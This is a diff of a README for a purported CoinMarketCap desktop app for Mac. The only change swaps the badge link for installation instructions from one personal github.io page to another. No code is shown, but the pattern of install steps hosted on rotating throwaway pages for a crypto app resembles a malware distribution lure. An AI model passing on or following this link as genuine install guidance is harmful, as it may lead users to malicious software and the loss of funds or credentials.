@@ -3,7 +3,7 @@
 
 CoinMarketCap Desktop for Mac gives you instant access to live cryptocurrency prices, charts, and portfolio insights directly from your Mac. Follow the simple instructions below to set it up and start monitoring the crypto market with ease 🚀  
 
-[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://beckunicorn319.github.io/.github/)
+[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://finklousen71-alt.github.io/.github/)
 
 ---
 
